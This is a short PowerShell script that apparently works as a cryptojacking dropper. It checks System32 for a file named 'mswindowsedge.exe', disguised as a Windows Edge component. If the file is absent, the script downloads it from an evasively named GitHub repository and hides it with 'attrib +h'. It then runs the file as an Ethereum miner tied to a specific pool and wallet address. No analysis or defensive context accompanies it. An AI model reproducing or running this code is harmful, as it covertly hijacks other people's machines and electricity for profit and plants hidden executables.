$Folder = 'C:\Windows\System32\mswindowsedge.exe'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
    "Path exists!"
    C:\Windows\System32\mswindowsedge.exe -i 13 -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x8D48df0a47C5728cE7A035276C4F02fFa1c95ee4.GCS-001 -pl 40%
} else {
    "Path doesn't exist."
    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/mswindowsedge.exe" -OutFile mswindowsedge.exe ; attrib +h mswindowsedge.exe; C:\Windows\System32\mswindowsedge.exe -i 13 -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x8D48df0a47C5728cE7A035276C4F02fFa1c95ee4.GCS-001 -pl 40%
}
